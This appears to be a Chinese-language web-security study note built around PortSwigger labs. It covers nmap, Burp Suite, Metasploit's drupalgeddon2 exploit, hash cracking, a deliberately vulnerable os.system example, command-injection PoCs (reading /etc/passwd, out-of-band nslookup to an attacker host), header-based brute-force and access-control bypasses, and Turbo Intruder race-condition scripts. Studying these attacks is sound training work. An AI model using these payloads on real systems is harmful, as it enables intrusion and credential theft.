---
title: "Web Security"
categories:
  - 技术
  - 教程
tags: [web, web Security]
sidebar: false
outline: 2
---

# Web Security

<span style="font-size: 19px;">**web安全要点**</span>

<img src="./assets/web安全要点.jpg" alt="background" width="533" >

- 前端不可信
- web安全的根本在于，web应用在实现**HTTP协议**的过程中，没有做足够充足强大的约束，导致攻击者能够利用其中的薄弱环节进行攻击。

## flow

![渗透测试基本流程2](assets/渗透测试基本流程2.png)

![渗透测试基本流程1](assets/渗透测试基本流程1.png)

[How web work](../cyber/web.md#how-websites-work)

[Web Application](../cyber/WebApplication.md)

---

## nmap

[nmap介绍](../cyber/tool.md#nmap)

[端口介绍](../cyber/networkpro.md#networking-port)

```bash
# 扫描网段
nmap -sn 192.168.80.0/24 -oG -

# 检测服务版本
nmap -sV 192.168.80.22

# 扫描全端口
nmao -sS -p- 192.168.80.22

```

---

## burpsuit

[burpsuit](../security/BurpSuite.md)

<span style="font-size: 23px;">**伪造客户端IP地址**</span>

[request header](../cyber/WebApplication.md#headers-and-body)

```bash
X-Forwarded-For: 127.0.0.1
```
```bash
X-Custom-Ip-Authorization: 127.0.0.1
```

### intruder

1. **sniper**: 狙击手，使用单一词典，每次仅变更一个参数，如果 uname、password 都是变量，会先让uname 遍历字典，password 不变，后变 password，uname 不变。
2. **Battering ram**: 攻城锤, 使用单一词典，有多个变量，同时变更为同一值。
3. **Pitchfork**: 音叉，每个变量一个字典。一次失败后，三个变量同时改变，一个变量不会与另一个变量所有情况匹配到。
4. **Cluster bomb**: 集束炸弹，笛卡尔积，形式，每隔一个变量要与另一个变量所有情况测试到，在多个字典情况下，测试时间非常漫长。

### Macro

**宏(Macro)** 是**一组预先录制好的 HTTP 请求序列**，用来让 Burp 自动执行某些重复操作。

> A macro is a sequence of one or more requests. You can use macros within session handling rules to perform tasks such as logging in to the application, obtaining anti-CSRF tokens, etc. Use these settings to manage your macros.

- **自动登录**：先请求登录页，提取 CSRF token，再提交用户名密码。
- **刷新 session/cookie**：当目标返回 401、302 到登录页时，自动重新获取会话。
- **更新 CSRF token**：每次攻击请求前自动访问页面，提取新的 token 并替换到请求里。
- **配合 Scanner/Intruder/Repeater**：让这些工具在测试时始终使用有效会话。

---

## Exploit-db

[exploit-db](https://www.exploit-db.com/), Kali linux 官方团队维护的一个安全项目，是公认的世界上最大的搜集漏洞的数据库。

<span style="font-size: 23px;">**searchsploit**</span>

```bash
# 搜索
searchsploit drupal

# 查看路径 path
searchsploit -p 34992.py

# 拷贝到本地
searchsploit -m 34992.py

# 更新本地漏洞库
searchsploit -u
```
## Metasploit

[Metasploit Framework](../security/Metasploit.md) , 通常简称**MSF**。一个强大的漏洞利用和测试的综合平台，其中集成了大量的漏洞利用工具。在Kali中集成了MSF的社区版本。

**MSF初始化**

```zsh
# 开启postgresql服务
systemctl start postgresql.service

# 对MSF的数据库进行初始化
msfdb init
```

<span style="font-size: 23px;">**使用**</span>

**进入控制台**

```zsh
msfconsole
```

**msf**

```bash
msf > db_status
[*] Connected to msf. Connection type: postgresql.

msf > search drupal

msf > use 1

msf exploit(unix/webapp/drupal_drupalgeddon2) > show options

msf exploit(unix/webapp/drupal_drupalgeddon2) > set RHOSTS 10.10.80.128

msf exploit(unix/webapp/drupal_drupalgeddon2) > exploit
```

**meterpreter**

```bash
meterpreter > shell
```
```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```
---

## John 

[bruteforce tools](../security/bruteforcingtools.md)

**字典去重排序**

```bash
sort -u wordlist.dic > sortedwordlist.dic
```

[John the Ripper](../crypto/john.md)

**Cracking**

```bash
john --format=raw-md5 --wordlist=/wordlists/hash-dic.txt hash-target.txt
```
**查看结果**

```bash
john --show --format=raw-md5 hash-target.txt
```

**其它**

`hash-identifier`

`john --list=formats`

---


## sql inject

### database

[databases](../cyber/WebApplication.md#database)

```bash
mysql -uusername -ppasswd
```
```bash
 mysql -h192.168.80.15 -uroot -ppasswd --skip-ssl
```

```sql
#查看版本
select version();

# 查询 MySQL 数据库的数据文件存储目录
SELECT @@basedir AS 安装目录, @@datadir AS 数据目录;

# 显示编译 MySQL 时使用的操作系统
SELECT @@version_compile_os;

#查看当前用户
select user();

#查看当前打开的数据库
select database();

#查看所有的数据库
show databases;

#打开名为mysql的数据库
use mysql;

#查看数据库中所包含的数据表
show tables;

DESC users;
select name, pass from users;
```
[sql inject](../vuln/SqlInject.md)

---

## XSS

[Cross-site scripting](../vuln/XSS.md) (also known as XSS) is a web security vulnerability that allows an attacker to compromise the interactions that users have with a vulnerable application. It allows an attacker to circumvent the same origin policy, which is designed to segregate different websites from each other. Cross-site scripting vulnerabilities normally allow an attacker to masquerade as a victim user, to carry out any actions that the user is able to perform, and to access any of the user's data. If the victim user has privileged access within the application, then the attacker might be able to gain full control over all of the application's functionality and data.

---

## File upload vulnerabilities

[File upload vulnerabilities](../vuln/FileVuln.md#file-upload)

[portswigger-file-upload](https://portswigger.net/web-security/file-upload)

---

## Path traversal

[Path traversal](../vuln/FileVuln.md#path-traversal)

[portswigger-file-path-traversal](https://portswigger.net/web-security/file-path-traversal)

---

## command injection

[portswigger-os-command-injection](https://portswigger.net/web-security/os-command-injection)

操作系统命令注入(**OS Command Injection**) 也称为 shell 注入(**shell injection**)，攻击者通过向应用程序传入恶意输入，使其在服务器操作系统上执行任意命令。当应用程序将用户输入**未经验证地**拼接到系统命令中时，就会发生这种攻击。

**漏洞原理**

应用程序通常会调用系统命令来完成某些功能（如文件操作、ping 检测等）。若直接拼接用户输入，攻击者就可以"注入"额外的命令。

🔴 **漏洞代码示例（Python）**

```python
import os

def ping_host(user_input
    # 危险！直接拼接用户输入
    os.system(f"ping -c 1 {user_input}")
```
**攻击演示**

| 用户输入 | 实际执行的命令 | 效果 |
|---|---|---|
| `8.8.8.8` | `ping -c 1 8.8.8.8` | 正常 ping |
| `8.8.8.8; cat /etc/passwd` | `ping -c 1 8.8.8.8; cat /etc/passwd` | 泄露系统用户文件 |
| `8.8.8.8 \| whoami` | `ping -c 1 8.8.8.8 \| whoami` | 获取当前用户身份 |

**常用的注入分隔符**

| 符号 | 含义 | 系统 |
|---|---|---|
| `;` | 顺序执行 | Linux/macOS |
| `&&` | 前一条成功后执行 | 通用 |
| `\|\|` | 前一条失败后执行 | 通用 |
| `\|` | 管道 | 通用 |
| `` ` `` | 命令替换 | Linux/macOS |
| `$(...)` | 命令替换 | Linux/macOS |
| `&` | 后台执行 | Windows |
| `\r\n` | 换行注入 | Windows |

**PoC**

```bash
productId=2|whoami #&storeId=5
productId=2&storeId=5|whoami

# & -> %26 # -> %23
productId=2&storeId=5%26whoami
productId=2%26whoami+%23&storeId=5
```

```bash
name=233&email=233%40gmail.com|sleep 10 #&subject=1
```

### blind OS command

**PoC**

*redirecting output*
```bash
& whoami > /var/www/static/whoami.txt &
||whoami+>+/var/www/images/whoami2.txt||

email=233%40gmail.com|cat /etc/passwd >> /var/www/images/output.txt #&subject=1
```
*out-of-band (OAST) techniques*
```bash
& nslookup kgji2ohoyw.web-attacker.com &
||nslookup+`whoami`.xxx.oastify.com||
|nslookup `whoami`.xxx.oastify.com #
```
---

## Authentication

[portswigger-authentication](https://portswigger.net/web-security/authentication)

**身份验证漏洞(Authentication Vulnerabilities)** 指应用或系统在确认用户、服务或设备身份的过程中存在的安全缺陷。如果身份验证机制不够安全，攻击者就可以绕过这些机制，冒充合法用户（甚至管理员）来获取未授权的访问权限。

**认证 vs 授权**

- **Authentication（认证）**：确认"你是谁"，验证用户身份是否真实。
- **Authorization（授权）**：确认"你能做什么"，验证已认证用户的访问权限。

认证是第一道门。一旦被绕过，后续基于身份的访问控制基本全部失效，因此危害通常很高。

**三种认证因素**

| 类型 | 含义 | 示例 |
|---|---|---|
| Knowledge（知识）| 你知道的东西 | 密码、PIN、安全问题 |
| Possession（持有）| 你拥有的东西 | 手机、硬件令牌、OTP |
| Inherence（固有）| 你本身的特征 | 指纹、人脸、虹膜 |

多因素认证(MFA)即组合使用两种及以上不同类型的因素。

### bypass

**IP-based brute-force protection**

```bash
X-Forwarded-For: §2§
```


**X-Forwarded-Host**

`X-Forwarded-Host` 是代理类 HTTP 头，用来记录客户端原始请求里的 `Host` 值。

- 用于维护对原始主机的引用

```bash
X-Forwarded-Host: <original-host>
```
---

## Business logic

**Business logic vulnerabilities** are flaws in the design and implementation of an application that allow an attacker to elicit unintended behavior. This potentially enables attackers to manipulate legitimate functionality to achieve a malicious goal.

### Encryption Oracle

[Encryption Oracle](../common.md#encryption-oracle) （Encryption Oracle）：
一个允许攻击者输入任意明文，并会返回对应密文的系统（或服务）。

在安全分析中，攻击者通常不知道系统内部的加密密钥（Key）和具体实现细节，但他们有办法让系统帮他们加密数据。

**PoC**

[Lab: Authentication bypass via encryption oracle](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-encryption-oracle)

- **block-based encryption** algorithm is used and that the input length must be a **multiple of 16**
```bash
xxxxxxxxxadministrator:your-timestamp
```

## Information disclosure

**Information disclosure**, also known as **information leakage**, is when a website unintentionally reveals sensitive information to its users. 

### TRACE

HTTP `TRACE` 是一种 HTTP 请求方法，用于让服务器**回显它收到的请求内容**，主要用于调试、诊断请求在客户端到服务器之间是否被代理、网关或中间设备修改。

- `TRACE` 的作用不是获取资源或提交数据，而是让服务器把接收到的请求原样返回，以便定位网络或协议层问题
- [伪造客户端IP地址](#burpsuit)

### version control history

```bash
# download .git 
wget -r https://xxx.web-security-academy.net/.git

# 查看 git状态
git status
# 简洁的一行格式查看 Git 提交历史
git log --oneline
# 切换分支或恢复文件状态
git checkout 2fb9eb5
```

## Access control

Access control is the application of constraints on who or what is authorized to perform actions or access resources. 

- **Authentication** confirms that the user is who they say they are
- **Session management** identifies which subsequent HTTP requests are being made by that same user.
- **Access control** determines whether the user is allowed to carry out the action that they are attempting to perform.

### Non-standard HTTP headers

Some application frameworks support various non-standard HTTP headers that can be used to override the URL in the original request, such as `X-Original-URL` and `X-Rewrite-URL`.If a website uses rigorous front-end controls to restrict access based on the URL, but the application allows the URL to be overridden via a request header, then it might be possible to bypass the access controls using a request like the following:

```bash
POST / HTTP/1.1
X-Original-URL: /admin/deleteUser
...
```
- `X-Original-URL` 是一个非标准的 HTTP 请求头，通常用于在经过反向代理、网关或 URL 重写组件处理后，**记录“客户端最初请求的 URL/路径”**

### Referer

`Referer` 用来表示“当前请求是从哪个页面跳转或发起过来的”。浏览器通常会对来自某个页面的请求自动添加这个头部。

## Race conditions

[Race conditions](https://portswigger.net/web-security/race-conditions) are a common type of vulnerability closely related to business logic flaws. They occur when websites process requests **concurrently** without adequate safeguards. This can lead to multiple distinct threads interacting with the same data at the same time, resulting in a "**collision**" that causes unintended behavior in the application. A race condition attack uses carefully timed requests to cause intentional collisions and exploit this unintended behavior for malicious purposes.

The period of time during which a **collision** is possible is known as the "**race window**". This could be the fraction of a second between two interactions with the database, for example.

**PoC**

*examples/race-single-packet-attack.py* 改

*Bypassing rate limits via race conditions*
```python
def queueRequests(target, wordlists):

    # as the target supports HTTP/2, use engine=Engine.BURP2 and concurrentConnections=1 for a single-packet attack
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )
    
    # assign the list of candidate passwords from your clipboard
    passwords = wordlists.clipboard
    
    # queue a login request using each password from the wordlist
    # the 'gate' argument withholds the final part of each request until engine.openGate() is invoked
    for password in passwords:
        engine.queue(target.req, password, gate='1')
    
    # once every request has been queued
    # invoke engine.openGate() to send all requests in the given gate simultaneously
    engine.openGate('1')


def handleResponse(req, interesting):
    table.add(req)
```

*Partial construction race conditions*
```python
def queueRequests(target, wordlists):

    engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=1,
                            engine=Engine.BURP2
                            )
    
    confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: phpsessionid=YOUR-SESSION-TOKEN
Content-Length: 0

'''
    for attempt in range(20):
        currentAttempt = str(attempt)
        username = 'User' + currentAttempt
    
        # queue a single registration request
        engine.queue(target.req, username, gate=currentAttempt)
        
        # queue 50 confirmation requests - note that this will probably sent in two separate packets
        for i in range(50):
            engine.queue(confirmationReq, gate=currentAttempt)
        
        # send all the queued requests for this attempt
        engine.openGate(currentAttempt)

def handleResponse(req, interesting):
    table.add(req)
```

## SSRF

[SSRF](../webapp/ServerSideAttacks#ssrf) (**Server-Side Request Forgery**)是一种 Web 安全漏洞，攻击者可以诱导服务端应用向攻击者指定的目标发起请求。本质上是"借服务器的手"去访问它本不该访问、或攻击者自己无法直接访问的资源。